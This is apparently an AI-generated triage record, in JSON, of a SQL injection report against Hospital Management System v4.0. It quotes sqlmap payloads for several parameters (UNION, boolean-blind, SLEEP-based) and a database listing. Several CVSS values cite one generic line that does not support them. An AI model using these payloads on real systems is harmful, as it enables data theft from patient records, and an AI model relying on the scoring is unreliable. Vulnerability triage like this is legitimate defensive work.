@@ -1,0 +1,77 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Multiple SQL injection vulnerabilities in Hospital Management System v4.0: POST parameter 'searchdata' in doctor search, GET parameter 'viewid' in view-patient.php, POST parameter 'bs' when adding medical history, POST parameter 'patname' when adding a patient, and POST parameter 'cpass' in admin change-password are all reported vulnerable. sqlmap evidence shows UNION, boolean- and time-based injections and database enumeration (MySQL/MariaDB).",
+    "affected_product": "Hospital Management System v4.0",
+    "cwe": "CWE-89",
+    "cwe_quote": "?searchdata parameter is vulnerable to SQL injection under the search feature in the doctor login.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "POST /hospital/hospital/hms/doctor/search.php HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      },
+      "PR": {
+        "value": "L",
+        "quote": " ?searchdata parameter is vulnerable to SQL injection under the search feature in the doctor login."
+      },
+      "UI": {
+        "value": "N",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      },
+      "S": {
+        "value": "U",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      },
+      "C": {
+        "value": "H",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      },
+      "I": {
+        "value": "H",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      },
+      "A": {
+        "value": "H",
+        "quote": "sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:"
+      }
+    },
+    "recommended_next_step": "Confirm and reproduce each injection in a test environment, identify reachable impact (data exfiltration, authentication bypass, administrative access) and determine required authentication for each endpoint; prepare a fix by parameterizing SQL queries or using prepared statements and apply input validation.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "searchdata parameter vulnerable and UNION proof",
+        "quote": "searchdata=&search=\n\n?searchdata parameter is vulnerable to SQL injection under the search feature in the doctor login.\n\nPOST parameter 'searchdata' is vulnerable.\nsqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:\n---\nParameter: searchdata (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: searchdata=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qvxbq','zIuFTDXhtLrbZmAXQXxIalrRpZgCjsPnduKboFfW'),'qpqjq'),NULL-- PqeG&search="
+      },
+      {
+        "claim": "database enumeration showing MySQL/MariaDB",
+        "quote": "[15:49:58] [INFO] testing MySQL\n[15:49:58] [INFO] confirming MySQL\n[15:49:58] [INFO] the back-end DBMS is MySQL\nweb application technology: Apache 2.4.41, PHP 7.4.1\nback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)"
+      },
+      {
+        "claim": "viewid parameter vulnerable (boolean/time/UNION)",
+        "quote": "GET parameter 'viewid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\nsqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:\n---\nParameter: viewid (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: viewid=6' AND 3413=3413 AND 'nBkv'='nBkv\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: viewid=6' AND SLEEP(5) AND 'PJim'='PJim\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: viewid=6' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162767071,0x7957464b6f4a78624b536a75497051715a71587353746a4b6e45716441646345614f725449555748,0x717a717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XNyp"
+      },
+      {
+        "claim": "bs parameter time-based blind SQLi when adding medical history",
+        "quote": "Parameter: bs (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: bp=123&bs=123' AND SLEEP(5) AND 'CKbI'='CKbI&weight=123&temp=123&pres=123&submit=\n\n?bs parameter is vulnerable to SQL injection on the doctors login when adding medical history to a patient"
+      },
+      {
+        "claim": "patname parameter vulnerable when adding patient",
+        "quote": "patname=\n\npatname parameter is vulnerable to SQLi under the add patient in the doctor login"
+      },
+      {
+        "claim": "cpass parameter vulnerable in admin change-password (blind/time-based)",
+        "quote": "Parameter: cpass (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)\n    Payload: cpass=123' AND 4808=4808#&npass=123&cfpass=123&submit=123\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: cpass=123' AND SLEEP(5)-- taxP&npass=123&cfpass=123&submit=123\n---\navailable databases [6]:\n[*] hms\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\n\nPOST /hospital/hospital/hms/admin/change-password.php HTTP/1.1"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 3361,
+    "output_tokens": 1517,
+    "latency_s": null,
+    "batch": true
+  }
+}
